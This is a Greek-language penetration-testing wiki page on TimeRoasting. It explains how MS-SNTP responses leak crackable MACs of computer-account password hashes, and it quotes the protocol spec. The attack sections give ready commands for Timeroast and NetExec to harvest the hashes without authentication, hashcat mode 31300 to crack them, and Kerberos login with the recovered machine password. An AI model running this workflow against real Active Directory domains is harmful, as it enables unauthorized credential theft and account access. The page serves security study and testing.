# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

Το TimeRoasting εκμεταλλεύεται το legacy MS-SNTP authentication extension. Στο MS-SNTP, ένας client μπορεί να στείλει ένα request 68 bytes που ενσωματώνει οποιοδήποτε computer account RID· ο domain controller χρησιμοποιεί το NTLM hash (MD4) του computer account ως key για να υπολογίσει ένα MAC πάνω στην response και το επιστρέφει.<sup>[[1]](#references)</sup> Οι attackers μπορούν να συλλέξουν αυτά τα MS-SNTP MACs χωρίς authentication και να τα κάνουν crack offline (Hashcat mode 31300), ώστε να ανακτήσουν τα passwords των computer accounts.<sup>[[2]](#references)</sup>

Για λεπτομέρειες, δείτε την ενότητα 3.1.5.1 "Authentication Request Behavior" και την ενότητα 4 "Protocol Examples" στο επίσημο MS-SNTP spec.<sup>[[1]](#references)</sup>
![TimeRoasting: Για λεπτομέρειες, δείτε την ενότητα 3.1.5.1 "Authentication Request Behavior" και την ενότητα 4 "Protocol Examples" στο επίσημο MS-SNTP spec](../../images/Pasted%20image%2020250709114508.png)
Όταν το ExtendedAuthenticatorSupported ADM element είναι false, ο client στέλνει ένα request 68 bytes και ενσωματώνει το RID στα least significant 31 bits του Key Identifier subfield του authenticator.<sup>[[1]](#references)</sup>

> Αν το ExtendedAuthenticatorSupported ADM element είναι false, ο client MUST να κατασκευάσει ένα Client NTP Request message. Το μήκος του Client NTP Request message είναι 68 bytes. Ο client ορίζει το Authenticator field του Client NTP Request message όπως περιγράφεται στην ενότητα 2.2.1, γράφοντας τα least significant 31 bits της τιμής RID στα least significant 31 bits του Key Identifier subfield του authenticator και στη συνέχεια γράφοντας την τιμή Key Selector στο most significant bit του Key Identifier subfield.<sup>[[1]](#references)</sup>

Από την ενότητα 4 (Protocol Examples):

> Αφού λάβει το request, ο server επαληθεύει ότι το μέγεθος του received message είναι 68 bytes. Υποθέτοντας ότι το μέγεθος του received message είναι 68 bytes, ο server εξάγει το RID από το received message. Ο server το χρησιμοποιεί για να καλέσει τη μέθοδο NetrLogonComputeServerDigest (όπως ορίζεται στην ενότητα 3.5.4.8.2 του [MS-NRPC]) για να υπολογίσει τα crypto-checksums και να επιλέξει το crypto-checksum με βάση το most significant bit του Key Identifier subfield από το received message, όπως ορίζεται στην ενότητα 3.2.5. Στη συνέχεια, ο server στέλνει μια response στον client, ορίζοντας το Key Identifier field σε 0 και το Crypto-Checksum field στο υπολογισμένο crypto-checksum.<sup>[[1]](#references)</sup>

Το crypto-checksum βασίζεται στο MD5 (δείτε την ενότητα 3.2.5.1.1) και μπορεί να γίνει crack offline, επιτρέποντας το roasting attack.<sup>[[1]](#references)</sup>

## Πώς να κάνετε Attack

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts από τον Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Πρακτική επίθεση (χωρίς authentication) με NetExec + Hashcat

- Το NetExec μπορεί να κάνει enumeration και να συλλέξει MS-SNTP MACs για computer RIDs χωρίς authentication και να εμφανίσει hashes `$sntp-ms$` έτοιμα για cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Κάντε crack offline με το Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Το ανακτημένο cleartext αντιστοιχεί στον κωδικό πρόσβασης ενός λογαριασμού υπολογιστή. Δοκιμάστε τον απευθείας ως λογαριασμό μηχανήματος χρησιμοποιώντας Kerberos (-k) όταν το NTLM είναι απενεργοποιημένο:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Λειτουργικές συμβουλές
- Βεβαιωθείτε για τον ακριβή συγχρονισμό ώρας πριν από το Kerberos: `sudo ntpdate <dc_fqdn>`
- Αν χρειάζεται, δημιουργήστε το krb5.conf για το AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Αντιστοιχίστε αργότερα τα RIDs με principals μέσω LDAP/BloodHound, μόλις αποκτήσετε οποιοδήποτε authenticated foothold.

## Παραπομπές

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – official docs](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
